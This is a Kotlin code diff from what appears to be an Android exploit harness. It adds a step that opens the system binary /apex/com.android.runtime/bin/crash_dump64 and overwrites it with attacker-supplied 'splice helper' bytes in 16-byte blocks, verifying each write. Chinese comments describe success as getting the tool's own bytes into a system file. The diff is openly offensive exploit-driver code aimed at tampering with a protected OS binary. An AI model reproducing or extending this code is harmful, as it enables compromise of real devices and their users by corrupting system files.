@@ -417,6 +417,37 @@ object TypedBackendProbe {
         val patch1Wrote = if (helperForImage != null) stepwise.writeImage(helperForImage, 0L, 16L, init43284()) else false
         step("typed: stepwise 43284 patch1 wrote=" + patch1Wrote + " refusal=" + stepwise.lastRefusal)
         step("typed: stepwise 43284 accessDestroy=" + stepwise.destroyAccessNow())
+
+        /*
+         *  patch#1（helper 步骤）：为 crash_dump64 单开**第二个实例**（目标由 Kotlin 决定），
+         *  用 embeddedImage(0) 的 helper 字节按 16 B 块写进去；writeImage 内部逐块回读比对，
+         *  正好就是上游那条「写 + 校验」语义（短读=verify skipped，不符=VerifyMismatch）。
+         *
+         *  判读：wrote=true ⇒ 我们自己的字节真的写进了系统文件；否则看 refusal（具名）。
+         */
+        val patchTarget = "/apex/com.android.runtime/bin/crash_dump64"
+        val patcher = Assembled43284(Native43284.create()) { init43284() }
+        step("typed: patch1 door=" + patcher.openTargetStepwise(patchTarget))
+        patcher.openEspSocket()
+        step("typed: patch1 surface=" + patcher.buildSurface())
+        step("typed: patch1 landing=" + patcher.buildLanding())
+        step("typed: patch1 access=" + patcher.buildAccess())
+        val patchParams = com.ghostlock.app.core.generated.AccessParams43284(
+            accessCarrierPath = patchTarget.toByteArray(),
+            accessDevCarrierPath = ByteArray(0),
+            accessPatchTargetPath = patchTarget.toByteArray(),
+            accessCarrierBase = 0L,
+            accessOffset = 0L,
+            accessOffsetSet = true,
+        )
+        step("typed: patch1 init=" + patcher.initializeAccessAndRemember(patchParams, init43284()) +
+            " refusal=" + patcher.lastRefusal)
+        val helperForPatch = patcher.image(Assembled43284.ROLE_IMAGE_SPLICE_HELPER)
+        val patchWrote = if (helperForPatch != null) patcher.writeImage(helperForPatch, 0L, 16L, init43284()) else false
+        step("typed: patch1 wrote=" + patchWrote + " refusal=" + patcher.lastRefusal +
+            " helperBytes=" + (helperForPatch?.size ?: -1))
+        step("typed: patch1 accessDestroy=" + patcher.destroyAccessNow())
+        step("typed: patch1 teardown=" + patcher.tearDown())
         val stepSeq = stepwise.nextSequence()
         step("typed: stepwise 43284 sequence=" + stepSeq)
         val stepTorn = stepwise.tearDown()
